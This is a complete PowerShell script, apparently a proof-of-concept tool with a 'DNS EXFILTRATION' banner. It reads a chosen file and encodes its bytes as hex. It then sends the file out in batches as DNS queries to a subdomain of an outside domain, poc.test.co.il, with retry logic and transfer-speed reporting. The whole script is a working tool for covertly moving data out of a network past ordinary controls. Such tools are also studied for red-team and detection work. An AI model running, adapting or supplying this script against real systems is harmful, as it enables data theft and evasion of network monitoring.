
cls
$folder = Read-Host -Prompt ‘Folder path [C:\Users\test\Downloads]’
$file = Read-Host -Prompt ‘File [test.jpg]’


$start_time = Get-Date
$random = Get-Random -Minimum 1000 -Maximum 1999

$dns_ns = "poc.test.co.il"
$test_dns = "test.$dns_ns"



cls


Write-Progress -Activity "   Completed: 0%" -Status "Pre-proccessing file: $file" -CurrentOperation "Please Wait..."
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host " ██▄▄▄█████▓▄▄▄    ▓██   ██▓     ██████ ██░ ██ ▄▄▄      ██▀███  ▒█████  ███▄    █ ██▓" -ForegroundColor Blue
Write-Host "▓██▓  ██▒ ▓▒████▄   ▒██  ██▒   ▒██    ▒▓██░ ██▒████▄   ▓██ ▒ ██▒██▒  ██▒██ ▀█   █▓██▒" -ForegroundColor Blue
Write-Host "▒██▒ ▓██░ ▒▒██  ▀█▄  ▒██ ██░   ░ ▓██▄  ▒██▀▀██▒██  ▀█▄ ▓██ ░▄█ ▒██░  ██▓██  ▀█ ██▒██▒" -ForegroundColor Blue
Write-Host "░██░ ▓██▓ ░░██▄▄▄▄██ ░ ▐██▓░     ▒   ██░▓█ ░██░██▄▄▄▄██▒██▀▀█▄ ▒██   ██▓██▒  ▐▌██░██░" -ForegroundColor Blue
Write-Host "░██░ ▒██▒ ░ ▓█   ▓██▒░ ██▒▓░   ▒██████▒░▓█▒░██▓▓█   ▓██░██▓ ▒██░ ████▓▒▒██░   ▓██░██░" -ForegroundColor Blue
Write-Host "░▓   ▒ ░░   ▒▒   ▓▒█░ ██▒▒▒    ▒ ▒▓▒ ▒ ░▒ ░░▒░▒▒▒   ▓▒█░ ▒▓ ░▒▓░ ▒░▒░▒░░ ▒░   ▒ ▒░▓  " -ForegroundColor Blue
Write-Host " ▒ ░   ░     ▒   ▒▒ ▓██ ░▒░    ░ ░▒  ░ ░▒ ░▒░ ░ ▒   ▒▒ ░ ░▒ ░ ▒░ ░ ▒ ▒░░ ░░   ░ ▒░▒ ░" -ForegroundColor Blue
Write-Host " ▒ ░ ░       ░   ▒  ▒ ▒ ░░     ░  ░  ░  ░  ░░ ░ ░   ▒    ░░   ░░ ░ ░ ▒    ░   ░ ░ ▒ ░" -ForegroundColor Blue
Write-Host " ░               ░  ░ ░              ░  ░  ░  ░     ░  ░  ░        ░ ░          ░ ░  " -ForegroundColor Blue
Write-Host "                    ░ ░                                                              " -ForegroundColor Blue


$verify_ip = (Resolve-DnsName -Name $test_dns -DnsOnly).IPAddress
if ($verify_ip -ne "8.8.9.9") {
    Write-Host "*ERROR*: DNS Server Returned wrong value, Exiting" -ForegroundColor Red
    exit
}


if ($file -match ' ') {
$file_new = $file -replace ' ', '_'
} else {
    $file_new = $file
}



$bytes = [System.IO.File]::ReadAllBytes("$folder$file")
$total = $bytes.Count
$size = (Get-Item "$folder$file").Length

if ($size -gt 1048576) {
    $size = [Math]::Round($size / 1048576, 2)
    $size = "$size MB"
} else {
    $size = [Math]::Round($size / 1024, 2)
    $size = "$size KB"
}


$numericalValues = [int[]] $bytes

$hexValues = $numericalValues | ForEach-Object {
    [Convert]::ToString($_, 16)
}

$numericalValues = $hexValues
cls

$current = 0
$i = 0
$batch = @()
$total = 0
$total = $numericalValues.Count
$current = 0
$errorCount = 0
$errorCount2 = 0
Resolve-DnsName -Name "$random-00000000-$file_new-.$dns_ns" -Type A > $null
$startTime = Get-Date
$currentNumber = 0
$batch = @()
$total = $numericalValues.Count
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""





Write-Host "██████  ███    ██ ███████     ███████ ██   ██ ███████ ██ ██      ████████ ██████   █████  ████████ ██  ██████  ███    ██ " -ForegroundColor Red
Write-Host "██   ██ ████   ██ ██          ██       ██ ██  ██      ██ ██         ██    ██   ██ ██   ██    ██    ██ ██    ██ ████   ██ " -ForegroundColor Red
Write-Host "██   ██ ██ ██  ██ ███████     █████     ███   █████   ██ ██         ██    ██████  ███████    ██    ██ ██    ██ ██ ██  ██ " -ForegroundColor Red
Write-Host "██   ██ ██  ██ ██      ██     ██       ██ ██  ██      ██ ██         ██    ██   ██ ██   ██    ██    ██ ██    ██ ██  ██ ██ " -ForegroundColor Red
Write-Host "██████  ██   ████ ███████     ███████ ██   ██ ██      ██ ███████    ██    ██   ██ ██   ██    ██    ██  ██████  ██   ████ " -ForegroundColor Red
Write-Host "                                                                                                                         " -ForegroundColor Red



Write-Host "*INFO* File: $file Size: $size Random_server_name: $random DNS_Server: $dns_ns" -BackgroundColor Gray -ForegroundColor Black
Write-Host ""

if ($file -ne $file_new) {
Write-Warning "The file name has been changed to: $file_new"
}





if ($total -gt 99999999) {
    Write-Host "*ERROR*: File size exceeds 99999999 DNS requests, Exiting." -ForegroundColor Red
    exit
}




     foreach ($value in $numericalValues) {
    $i++
    $current++
    $batch += $value
    $elapsedTime = (Get-Date) - $startTime
    $elapsedTimeString = "{0:D2}:{1:D2}:{2:D2}" -f [int]$elapsedTime.TotalHours, $elapsedTime.Minutes, $elapsedTime.Seconds
    $average = $elapsedTime.TotalMinutes / $current
    $remainingTime = [math]::Round(($average * ($total - $current)),0)
    if ($remainingTime -eq 0) {
       $remainingTime = "less than 1 minute"
    }
    elseif ($remainingTime -gt 59) {
       $remainingTime = "{0:F1}" -f ($remainingTime / 60)
       $remainingTime = "$remainingTime hour(s)"
    }
    else {
       $remainingTime = "$remainingTime minute(s)"
    }
    #Calculating the percent completed
    $percentCompleted = [Math]::Round(($current / $total) * 100, 0)
    # transfer speed calculation
    $currentTransferSpeed = ($current * 16) / ($elapsedTime.TotalSeconds)
    $currentTransferSpeed = "{0:N2}" -f ($currentTransferSpeed/1024)
    Write-Progress -Activity "   Completed: $percentCompleted%" -Status "Sending Query $current of $total, elapsed time: $elapsedTimeString, remaining time: $remainingTime, transfer speed: $currentTransferSpeed Kbps" -PercentComplete $percentCompleted
    if ($batch.Count -eq 16 -or $i -eq $numericalValues.Count) {
        $currentNumber++
        $name = "{0:D8}-{1}" -f $currentNumber, ($batch -join '-')
        Start-Sleep -Milliseconds 50
        $queryResult = Resolve-DnsName -Name "$random-$name-.$dns_ns" -Type A -DnsOnly 2>$1
        if (!$queryResult) {
            $errorCount++
            Write-Warning "Network Error, DNS request: $currentNumber might lost!!, sending same rquest again just in case."
            Start-Sleep -Seconds 20
            $queryResult2 = Resolve-DnsName -Name "$random-$name-.$dns_ns" -Type A -DnsOnly 2>$1
            if (!$queryResult2) {
                $errorCount2++
                Write-Warning "Network Error, DNS request: $currentNumber might lost!!, sending same rquest again just in case (second attempt)."
                #Write-Host "*ERROR*: Network Error, DNS request: $currentNumber was lost!!, stoping execution." -ForegroundColor Red
                #Write-Host "Network Errors, packets might lost: $errorCount" -BackgroundColor Red -ForegroundColor White
                Start-Sleep -Seconds 300
                $queryResult3 = Resolve-DnsName -Name "$random-$name-.$dns_ns" -Type A -DnsOnly 2>$1
                if (!$queryResult3) {
                    Write-Host "*ERROR*: Network Error, DNS request: $currentNumber was lost!!, stoping execution." -ForegroundColor Red
                    Write-Host "Network Errors, packets might lost: $errorCount" -BackgroundColor Red -ForegroundColor White
                    exit
                    }
                    
                
            }
        }
        $batch = @()
    }
}

$end_time = Get-Date
$totaltime = New-TimeSpan -Start $start_time -End $end_time
$executionTimeInMinutes = [Math]::Round($totaltime.TotalMinutes, 2)

$fast_slow = "slow"
if ($executionTimeInMinutes -le 1) {
   $fast_slow = "fast"
}


Write-Host "File: $file Sent successfuly with random name of: $random, it was super $fast_slow and took $elapsedTimeString minutes avg speed: $currentTransferSpeed" -BackgroundColor Green -ForegroundColor Black
